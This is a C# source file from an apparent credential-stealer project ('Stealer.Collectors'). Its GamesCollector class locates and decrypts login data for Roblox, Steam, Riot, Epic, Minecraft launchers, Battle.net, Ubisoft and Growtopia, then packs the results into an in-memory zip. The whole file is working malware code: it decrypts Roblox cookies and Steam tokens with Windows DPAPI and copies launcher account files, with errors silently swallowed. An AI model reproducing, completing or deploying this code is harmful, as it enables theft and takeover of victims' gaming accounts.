using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Text.RegularExpressions;
using Stealer.Crypto;
using Stealer.Utils;

namespace Stealer.Collectors
{
    public class GamesCollector
    {
        public static void Collect(InMemoryZip zip)
        {
            try
            {
                int collected = 0;

                collected += CollectRoblox(zip);
                collected += CollectRiot(zip);
                collected += CollectEpic(zip);
                collected += CollectMinecraft(zip);
                collected += CollectBattleNet(zip);
                collected += CollectUplay(zip);
                collected += CollectGrowtopia(zip);
                collected += CollectSteam(zip);

            }
            catch
            {
            }
        }

        private static int CollectRoblox(InMemoryZip zip)
        {
            int count = 0;
            try
            {
                string cookiesPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Roblox", "LocalStorage", "RobloxCookies.dat");
                if (!File.Exists(cookiesPath))
                    return 0;

                string cookiesData = File.ReadAllText(cookiesPath);
                Match match = Regex.Match(cookiesData, "\"CookiesData\"\\s*:\\s*\"(.*?)\"", RegexOptions.Singleline);
                
                if (match.Success)
                {
                    byte[] decrypted = DpApi.Decrypt(Convert.FromBase64String(match.Groups[1].Value));
                    if (decrypted != null)
                    {
                        string cookies = Encoding.UTF8.GetString(decrypted).Replace("; ", "\n").Replace("#HttpOnly_.roblox.com", ".roblox.com");
                        zip.AddTextFile("Games/Roblox/cookies.txt", cookies);
                        count++;

                        // appStorage.json
                        string appStoragePath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Roblox", "LocalStorage", "appStorage.json");
                        if (File.Exists(appStoragePath))
                        {
                            string appStorage = File.ReadAllText(appStoragePath);
                            List<string> info = new List<string>();

                            string pattern = "\"(PlayerExeLaunchTime|BrowserTrackerId|UserId|Username|DisplayName|CountryCode)\"\\s*:\\s*\"([^\"]*)\"";
                            foreach (Match m in Regex.Matches(appStorage, pattern))
                            {
                                string key = m.Groups[1].Value;
                                string value = m.Groups[2].Value;
                                if (!string.IsNullOrEmpty(value))
                                {
                                    info.Add($"{key}: {value}\n");
                                }
                            }

                            if (info.Count > 0)
                            {
                                zip.AddTextFile("Games/Roblox/information.txt", string.Concat(info));
                                count++;
                            }

                            Match userAgent = Regex.Match(appStorage, "\"WebViewUserAgent\"\\s*:\\s*\"([^\"]*)\"");
                            if (userAgent.Success)
                            {
                                zip.AddTextFile("Games/Roblox/useragent.txt", userAgent.Groups[1].Value);
                                count++;
                            }
                        }
                    }
                }
            }
            catch { }

            return count;
        }

        private static int CollectRiot(InMemoryZip zip)
        {
            int count = 0;
            try
            {
                string settingsPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Riot Games", "Riot Client", "Data", "RiotGamesPrivateSettings.yaml");
                if (File.Exists(settingsPath))
                {
                    zip.AddFile("Games/Riot/RiotGamesPrivateSettings.yaml", File.ReadAllBytes(settingsPath));
                    count++;
                }
            }
            catch { }

            return count;
        }

        private static int CollectEpic(InMemoryZip zip)
        {
            int count = 0;
            try
            {
                string settingsPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "EpicGamesLauncher", "Saved", "Config", "Windows", "GameUserSettings.ini");
                if (File.Exists(settingsPath))
                {
                    string content = File.ReadAllText(settingsPath);
                    if (content.Contains("[RememberMe]") || content.Contains("[Offline]"))
                    {
                        zip.AddFile("Games/Epic/GameUserSettings.ini", Encoding.UTF8.GetBytes(content));
                        count++;
                    }
                }
            }
            catch { }

            return count;
        }

        private static int CollectMinecraft(InMemoryZip zip)
        {
            int count = 0;
            try
            {
                string appData = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
                string userProfile = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);

                Dictionary<string, string> launchers = new Dictionary<string, string>(StringComparer.OrdinalIgnoreCase)
                {
                    { "Intent", Path.Combine(userProfile, "intentlauncher", "launcherconfig") },
                    { "Lunar", Path.Combine(userProfile, ".lunarclient", "settings", "game", "accounts.json") },
                    { "TLauncher", Path.Combine(appData, ".minecraft", "TlauncherProfiles.json") },
                    { "Feather", Path.Combine(appData, ".feather", "accounts.json") },
                    { "Meteor", Path.Combine(appData, ".minecraft", "meteor-client", "accounts.nbt") },
                    { "Impact", Path.Combine(appData, ".minecraft", "Impact", "alts.json") },
                    { "Novoline", Path.Combine(appData, ".minecraft", "Novoline", "alts.novo") },
                    { "CheatBreakers", Path.Combine(appData, ".minecraft", "cheatbreaker_accounts.json") },
                    { "Microsoft Store", Path.Combine(appData, ".minecraft", "launcher_accounts_microsoft_store.json") },
                    { "Rise", Path.Combine(appData, ".minecraft", "Rise", "alts.txt") },
                    { "Rise (Intent)", Path.Combine(userProfile, "intentlauncher", "Rise", "alts.txt") },
                    { "Paladium", Path.Combine(appData, "paladium-group", "accounts.json") },
                    { "PolyMC", Path.Combine(appData, "PolyMC", "accounts.json") },
                    { "Badlion", Path.Combine(appData, "Badlion Client", "accounts.json") }
                };

                foreach (var launcher in launchers)
                {
                    if (File.Exists(launcher.Value))
                    {
                        try
                        {
                            string fileName = Path.GetFileName(launcher.Value);
                            string targetPath = $"Games/Minecraft/{launcher.Key}/{fileName}";
                            zip.AddFile(targetPath, File.ReadAllBytes(launcher.Value));
                            count++;
                        }
                        catch { }
                    }
                }
            }
            catch { }

            return count;
        }

        private static int CollectBattleNet(InMemoryZip zip)
        {
            int count = 0;
            try
            {
                string battleNetPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Battle.net");
                if (!Directory.Exists(battleNetPath))
                    return 0;

                string[] patterns = { "*.db", "*.config" };

                foreach (string pattern in patterns)
                {
                    foreach (string file in Directory.GetFiles(battleNetPath, pattern, SearchOption.AllDirectories))
                    {
                        try
                        {
                            FileInfo fileInfo = new FileInfo(file);
                            string dirName = fileInfo.Directory.Name == "Battle.net" ? "" : fileInfo.Directory.Name;
                            string targetPath = Path.Combine("Games/BattleNet", dirName, fileInfo.Name);
                            zip.AddFile(targetPath, File.ReadAllBytes(file));
                            count++;
                        }
                        catch { }
                    }
                }
            }
            catch { }

            return count;
        }

        private static int CollectUplay(InMemoryZip zip)
        {
            int count = 0;
            try
            {
                string uplayPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Ubisoft Game Launcher");
                if (!Directory.Exists(uplayPath))
                    return 0;

                foreach (string file in Directory.GetFiles(uplayPath, "*", SearchOption.AllDirectories))
                {
                    try
                    {
                        FileInfo fileInfo = new FileInfo(file);
                        if (fileInfo.Length > 5 * 1024 * 1024) // 5MB limit
                            continue;

                        string relativePath = file.Substring(uplayPath.Length + 1);
                        string targetPath = Path.Combine("Games/Uplay", relativePath);
                        zip.AddFile(targetPath, File.ReadAllBytes(file));
                        count++;
                    }
                    catch { }
                }
            }
            catch { }

            return count;
        }

        private static int CollectGrowtopia(InMemoryZip zip)
        {
            int count = 0;
            try
            {
                string savePath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Growtopia", "save.dat");
                if (File.Exists(savePath))
                {
                    zip.AddFile("Games/Growtopia/save.dat", File.ReadAllBytes(savePath));
                    count++;
                }
            }
            catch { }

            return count;
        }

        private static int CollectSteam(InMemoryZip zip)
        {
            int count = 0;
            try
            {
                var steamKey = Microsoft.Win32.Registry.CurrentUser.OpenSubKey("Software\\Valve\\Steam");
                if (steamKey == null || steamKey.GetValue("SteamPath") == null)
                    return 0;

                string steamPath = steamKey.GetValue("SteamPath").ToString();
                if (!Directory.Exists(steamPath))
                    return 0;

                var tokens = new List<string>();

                try
                {
                    string[] localVdfPaths = new[]
                    {
                        Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Steam", "local.vdf"),
                        Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Steam", "local.vdf")
                    };

                    string[] loginUsersPaths = new[]
                    {
                        Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFilesX86), "Steam", "config", "loginusers.vdf"),
                        Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Steam", "config", "loginusers.vdf"),
                        Path.Combine(steamPath, "config", "loginusers.vdf")
                    };

                    string localVdfPath = localVdfPaths.FirstOrDefault(File.Exists);
                    string loginUsersPath = loginUsersPaths.FirstOrDefault(File.Exists);

                    if (localVdfPath != null && loginUsersPath != null)
                    {
                        string accountPattern = @"""AccountName""\s*""([^""]+)""";
                        string tokenPattern = @"([a-fA-F0-9]{500,2000})";

                        var accountMatches = Regex.Matches(File.ReadAllText(loginUsersPath), accountPattern);
                        var tokenMatches = Regex.Matches(File.ReadAllText(localVdfPath), tokenPattern);

                        if (accountMatches.Count > 0 && tokenMatches.Count > 0)
                        {
                            foreach (Match accountMatch in accountMatches)
                            {
                                byte[] accountBytes = System.Text.Encoding.UTF8.GetBytes(accountMatch.Groups[1].Value);

                                foreach (Match tokenMatch in tokenMatches)
                                {
                                    try
                                    {
                                        byte[] encryptedData = Enumerable.Range(0, tokenMatch.Value.Length / 2)
                                            .Select(x => Convert.ToByte(tokenMatch.Value.Substring(x * 2, 2), 16))
                                            .ToArray();

                                        byte[] decryptedBytes = Crypto.DpApi.Decrypt(encryptedData, accountBytes);
                                        if (decryptedBytes != null)
                                        {
                                            string token = System.Text.Encoding.UTF8.GetString(decryptedBytes);
                                            tokens.Add($"{accountMatch.Groups[1].Value}.{token}");
                                            break;
                                        }
                                    }
                                    catch { }
                                }
                            }
                        }
                    }
                }
                catch { }

                if (tokens.Count > 0)
                {
                    zip.AddTextFile("Games/Steam/SteamTokens.txt", string.Join("\n\n", tokens));
                    count = tokens.Count;
                }
            }
            catch { }

            return count;
        }
    }
}
